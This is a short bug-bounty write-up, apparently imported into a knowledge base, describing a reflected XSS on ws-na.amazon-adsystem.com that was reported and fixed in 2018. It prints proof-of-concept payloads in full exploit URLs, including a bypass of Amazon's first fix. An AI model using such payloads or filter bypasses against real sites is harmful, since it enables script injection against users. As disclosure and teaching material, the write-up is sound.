---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2018-12-27_reflected-xss-on-ws-naamazon-adsystemcomamazon.md
original_filename: 2018-12-27_reflected-xss-on-ws-naamazon-adsystemcomamazon.md
title: Reflected XSS on ws-na.amazon-adsystem.com(Amazon)
category: documents
detected_topics:
- xss
- command-injection
tags:
- imported
- documents
- xss
- command-injection
language: en
raw_sha256: 7ea507718f56ea9e9114f2d890fb6aba33ca7d8dd89325091cac9d23bb9afac2
text_sha256: adf81b31d232c4ccfc55e690b32817b613bd05e130b5f8e5391b55d53fd6aee0
ingested_at: '2026-06-28T07:31:58Z'
sensitivity: unknown
redactions_applied: false
---

# Reflected XSS on ws-na.amazon-adsystem.com(Amazon)

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2018-12-27_reflected-xss-on-ws-naamazon-adsystemcomamazon.md
- Source Type: markdown
- Detected Topics: xss, command-injection
- Ingested At: 2026-06-28T07:31:58Z
- Redactions Applied: False
- Raw SHA256: `7ea507718f56ea9e9114f2d890fb6aba33ca7d8dd89325091cac9d23bb9afac2`
- Text SHA256: `adf81b31d232c4ccfc55e690b32817b613bd05e130b5f8e5391b55d53fd6aee0`


## Content

---
title: "Reflected XSS on ws-na.amazon-adsystem.com(Amazon)"
url: "https://medium.com/@newp_th/reflected-xss-on-ws-na-amazon-adsystem-com-amazon-f1e55f1d24cf"
authors: ["ssid (@newp_th)"]
programs: ["Amazon"]
bugs: ["Reflected XSS"]
publication_date: "2018-12-27"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 5502
scraped_via: "browseros"
---

# Reflected XSS on ws-na.amazon-adsystem.com(Amazon)

newp_th
 highlighted

Reflected XSS on ws-na.amazon-adsystem.com(Amazon)
newp_th
Follow
1 min read
·
Dec 27, 2018

186

2

This is newp_th. This issue is very similar to my previous report on Reflected XSS on Stack Overflow.

It was much easier than before, Just append a malicious payload “><script/k/>alert(113)</script/k/> to parameter.

https://ws-na.amazon-adsystem.com/widgets/q?ServiceVersion=20070822&OneJS=1&Operation=GetAdHtml&MarketPlace=US&source=ss&ref=as_ss_li_til&ad_type=product_link&tracking_id=jgsbookselection%22%3E%3Cscript/k/%3Ealert(113)%3C/script/k/%3E&marketplace=amazon&region=US&placement=1449319432&asins=1449319432&linkId=cc38d5883c3f92bbeb69b93a6810322a&show_border=true&link_opens_in_new_window=true

Press enter or click to view image in full size

Few weeks after reporting this issue to amazon security team, I got a reply that issue has been resolved and to verify it again. On further testing I could easily bypass the fix using payload “-confirm(1)-”.

Get newp_th’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

https://ws-na.amazon-adsystem.com/widgets/q?ServiceVersion=20070822&OneJS=1&Operation=GetAdHtml&MarketPlace=US&source=ss&ref=as_ss_li_til&ad_type=product_link&tracking_id=1%22-confirm(1)-%22&marketplace=amazon&region=US&placement=1449319432&asins=1449319432&linkId=cc38d5883c3f92bbeb69b93a6810322a&show_border=true&link_opens_in_new_window=true#

Press enter or click to view image in full size

Thanks for reading. Hope will get time to write some more posts.

Timeline:

29-May-2018: Bug reported

29-May-2018: Bug confirmed by security team

25-June-2018: Bug Fixed

27-June-2018: Bypassed Fix

12-Dec-2018: Bug Resolved
